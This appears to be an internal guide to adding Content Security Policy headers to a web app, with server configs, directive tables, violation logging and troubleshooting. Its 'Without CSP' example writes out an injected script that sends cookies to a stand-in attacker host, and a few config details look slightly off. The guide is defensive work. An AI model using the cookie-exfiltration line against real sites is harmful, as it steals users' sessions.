# Content Security Policy (CSP) Implementation Guide

**Date**: 2025-12-04
**Feature**: 004-rich-text-editor
**Phase**: Security Hardening (Medium Priority)
**Estimated Time**: 1 hour

## Overview

Content Security Policy (CSP) is a browser security mechanism that prevents cross-site scripting (XSS), clickjacking, and other code injection attacks by controlling which resources can be loaded.

## Security Risks

### Without CSP
```
1. Attacker injects malicious script:
   <script>
   // Steal user session tokens
   fetch('https://attacker.com/log?cookie=' + document.cookie)
   </script>

2. Script executes in context of your application
3. User credentials stolen
4. Account compromised
```

### With CSP
```
1. Attacker injects malicious script
2. Browser blocks inline script execution (CSP: script-src 'self')
3. Malicious fetch blocked (CSP: connect-src 'self')
4. Attack prevented
```

## Implementation

### 1. Service Layer (`src/services/cspHeaders.ts`)

**Core Functions**:

```typescript
// Build CSP header string from policy
const header = buildCSPHeader(policy)
// Returns: "default-src 'self'; script-src 'self' https://cdn.example.com; ..."

// Get all CSP and security headers
const headers = getCSPHeaders()
// Returns: {
//   'Content-Security-Policy': '...',
//   'X-Content-Type-Options': 'nosniff',
//   'X-Frame-Options': 'DENY',
//   ...
// }

// Log CSP violations
logCSPViolation(report)
```

### 2. Vite Configuration Integration

**Update `vite.config.ts`**:

```typescript
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'
import { getCSPHeaders } from './src/services/cspHeaders'

export default defineConfig({
  plugins: [react()],
  server: {
    middlewares: [
      // Add CSP headers to dev server
      (req, res, next) => {
        const headers = getCSPHeaders()
        Object.entries(headers).forEach(([key, value]) => {
          res.setHeader(key, value)
        })
        next()
      },
    ],
  },
})
```

### 3. Component Integration

**Handle CSP Violations**:

```typescript
import { logCSPViolation } from '@/services/cspHeaders'

useEffect(() => {
  // Listen for CSP violations
  const handleSecurityPolicyViolation = (event: SecurityPolicyViolationEvent) => {
    logCSPViolation({
      'document-uri': event.documentURI,
      'violated-directive': event.violatedDirective,
      'blocked-uri': event.blockedURI,
      'source-file': event.sourceFile,
      'line-number': event.lineNumber,
      'column-number': event.columnNumber,
    })
  }

  document.addEventListener('securitypolicyviolation', handleSecurityPolicyViolation)

  return () => {
    document.removeEventListener('securitypolicyviolation', handleSecurityPolicyViolation)
  }
}, [])
```

### 4. Production Deployment

**Nginx Configuration**:

```nginx
server {
    listen 443 ssl;
    server_name newsletter.example.com;

    # CSP Headers
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; frame-src 'self' https://www.youtube.com; connect-src 'self' https://*.supabase.co; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; object-src 'none'; upgrade-insecure-requests; block-all-mixed-content;" always;

    # Additional security headers
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-no-referrer" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
}
```

**Apache Configuration**:

```apache
<IfModule mod_headers.c>
    Header always set Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; frame-src 'self' https://www.youtube.com; connect-src 'self' https://*.supabase.co; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; object-src 'none'; upgrade-insecure-requests; block-all-mixed-content;"
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-Frame-Options "DENY"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set Referrer-Policy "strict-no-referrer"
    Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
</IfModule>
```

## Directives Explained

| Directive | Purpose | Example |
|-----------|---------|---------|
| `default-src` | Fallback for all unspecified directives | `'self'` |
| `script-src` | Controls script loading | `'self' https://cdn.example.com` |
| `style-src` | Controls stylesheet loading | `'self' https://fonts.googleapis.com` |
| `img-src` | Controls image sources | `'self' data: https:` |
| `font-src` | Controls font loading | `'self' data:` |
| `connect-src` | Controls fetch/XMLHttpRequest/WebSocket | `'self' https://api.example.com` |
| `frame-src` | Controls iframe sources | `'self' https://www.youtube.com` |
| `object-src` | Controls plugin sources | `'none'` |
| `frame-ancestors` | Controls embedding (prevents clickjacking) | `'none'` |
| `form-action` | Restricts form submission targets | `'self'` |
| `base-uri` | Restricts `<base>` tag URLs | `'self'` |
| `upgrade-insecure-requests` | Auto-upgrade HTTP to HTTPS | Flag |
| `block-all-mixed-content` | Block HTTP content on HTTPS pages | Flag |

## Source List Values

| Value | Meaning |
|-------|---------|
| `'self'` | Same origin as document |
| `'unsafe-inline'` | Allow inline scripts/styles (⚠️ risky) |
| `'unsafe-eval'` | Allow eval() (⚠️ very risky) |
| `https://example.com` | Specific domain |
| `*.example.com` | Any subdomain |
| `https:` | Any HTTPS domain |
| `data:` | Data URLs |
| `blob:` | Blob URLs |
| `'none'` | Block all |

## Development vs Production

### Development Configuration
```typescript
CSP_DEVELOPMENT = {
  // Allows HMR, inline styles
  'script-src': ["'self'", "'unsafe-inline'", "https://cdn.example.com"],
  'style-src': ["'self'", "'unsafe-inline'"],
  // Allows localhost
  'connect-src': ["'self'", "http://localhost:54321", "https://*.supabase.co"],
}
```

**Why?**
- Vite HMR requires `'unsafe-inline'`
- Tailwind CSS requires inline styles
- Local debugging with localhost

### Production Configuration
```typescript
CSP_PRODUCTION = {
  // Strict - no inline scripts
  'script-src': ["'self'", "https://cdn.example.com"],
  'style-src': ["'self'", "https://fonts.googleapis.com"],
  // No localhost
  'connect-src': ["'self'", "https://*.supabase.co"],
  // Additional hardening
  'upgrade-insecure-requests': true,
  'block-all-mixed-content': true,
}
```

**Why?**
- Prevents inline script injection
- Requires HTTPS
- Blocks mixed content
- Maximum security

## Testing

### Unit Tests
22 comprehensive test cases in `tests/unit/services/cspHeaders.test.ts`:

- ✅ Header building and formatting
- ✅ Development vs production configs
- ✅ Directive compliance
- ✅ Security headers validation
- ✅ Violation logging

All tests passing ✅

### Browser Testing

1. **Check Headers**:
   - Open DevTools → Network → Response Headers
   - Verify `Content-Security-Policy` header present

2. **Trigger Violations**:
   ```javascript
   // This should be blocked
   <script>eval('alert("XSS")')</script>

   // Check Console for CSP violation
   // Should see: CSP Violation: violated-directive: script-src
   ```

3. **Test Specific Directives**:
   ```javascript
   // Try to load from disallowed origin
   const img = new Image()
   img.src = 'https://evil.com/image.jpg'
   document.body.appendChild(img)

   // Should be blocked and logged
   ```

## Common Issues & Solutions

### Issue: "Inline script execution blocked"
```
Refused to execute inline script because it violates the CSP directive: "script-src 'self'"
```

**Solution**:
1. Move inline scripts to separate `.js` files
2. Use data attributes instead of inline handlers
3. Or add `'unsafe-inline'` in development only

Example:
```html
<!-- ❌ Bad (blocked) -->
<button onclick="handleClick()">Click</button>

<!-- ✅ Good -->
<button data-action="click">Click</button>
```

```typescript
// In JS
document.querySelector('[data-action="click"]').addEventListener('click', handleClick)
```

### Issue: "Style injection blocked"
```
Refused to apply inline style because it violates the CSP directive: "style-src 'self'"
```

**Solution for Tailwind CSS**:
- Tailwind generates classes at build time
- Use class-based styling, not inline styles

```jsx
// ❌ Bad (inline style)
<div style={{ color: 'red' }}>Text</div>

// ✅ Good (Tailwind class)
<div className="text-red-500">Text</div>
```

### Issue: "Font loading blocked"
```
Refused to load the font 'https://fonts.gstatic.com/...' because it violates the CSP directive: "font-src 'self'"
```

**Solution**:
Add font sources to CSP:
```typescript
'font-src': [
  "'self'",
  "https://fonts.gstatic.com",
  "data:" // For inline data URLs
]
```

### Issue: "API requests blocked"
```
Refused to connect to 'https://api.example.com' because it violates the CSP directive: "connect-src 'self'"
```

**Solution**:
Add API domains to connect-src:
```typescript
'connect-src': [
  "'self'",
  "https://api.example.com",
  "https://*.supabase.co"
]
```

## Monitoring & Reporting

### Enable CSP Reporting

```typescript
CSP_PRODUCTION = {
  directives: { /* ... */ },
  reportUri: '/api/csp-report'
}
```

### Create Reporting Endpoint

```typescript
// src/pages/api/csp-report.ts
export async function POST(req: Request) {
  const report = await req.json()

  // Log to monitoring service
  console.error('CSP Violation:', {
    timestamp: new Date().toISOString(),
    violatedDirective: report['violated-directive'],
    blockedUri: report['blocked-uri'],
    sourceFile: report['source-file'],
    documentUri: report['document-uri'],
  })

  // Send to external service (Sentry, DataDog, etc.)
  // await sendToMonitoring(report)

  return new Response(JSON.stringify({ success: true }), {
    status: 204,
  })
}
```

### Monitor Metrics

Track violations by:
- Directive type (most common violations)
- Source file (problematic code locations)
- Browser/user agent (compatibility issues)
- Time patterns (attacks or bugs)

## Security Best Practices

### ✅ DO
- Use `'self'` as default
- Block plugins with `object-src 'none'`
- Prevent framing with `frame-ancestors 'none'`
- Use HTTPS with `upgrade-insecure-requests`
- Set strict `base-uri`
- Use nonce or hash for inline scripts (if needed)
- Enable reporting to catch violations
- Review CSP logs regularly
- Test in both dev and prod modes

### ❌ DON'T
- Use `default-src *` (allows anything)
- Trust `'unsafe-inline'` in production
- Use `'unsafe-eval'` (extremely dangerous)
- Allow all subdomains with `*`
- Put sensitive data in inline scripts
- Ignore CSP violation reports
- Mix HTTP and HTTPS without upgrade

## Nonce for Inline Scripts (Advanced)

If you absolutely need inline scripts in production:

```typescript
// Generate nonce
const nonce = crypto.randomUUID()

// CSP directive
'script-src': [
  "'self'",
  `'nonce-${nonce}'"
]
```

```html
<script nonce="...generated-nonce...">
  // Only this script runs
</script>
```

## Integration with Other Security Measures

### Defense-in-Depth

```
1. CORS (Network Layer)
   └─ Restrict origins

2. CSP (Content Layer)
   └─ Control resource loading

3. CSRF (Request Layer)
   └─ Validate request legitimacy

4. Authentication (User Layer)
   └─ Verify user identity

5. Input Validation (Data Layer)
   └─ Sanitize/validate inputs
```

## References

- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP: Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [CSP Documentation](https://content-security-policy.com/)

## Deployment Checklist

- [ ] Configure CSP headers in Vite dev server
- [ ] Create production CSP policy
- [ ] Test all features work with CSP enabled
- [ ] Set up CSP violation reporting endpoint
- [ ] Deploy to staging environment
- [ ] Monitor CSP violations for 24 hours
- [ ] Review and adjust directives as needed
- [ ] Deploy to production
- [ ] Set up continuous monitoring
- [ ] Document all allowed sources
- [ ] Train team on CSP best practices

## Related Security Items

This is part of the **Medium Priority Security Hardening**:
1. ✅ **Rate Limiting** (CRITICAL - COMPLETED)
2. ✅ **Storage Quotas** (CRITICAL - COMPLETED)
3. ✅ **Dependency Updates** (CRITICAL - COMPLETED)
4. ✅ **CORS Configuration** (COMPLETED)
5. ✅ **CSRF Protection** (COMPLETED)
6. 🔄 **CSP Headers** (THIS ITEM)
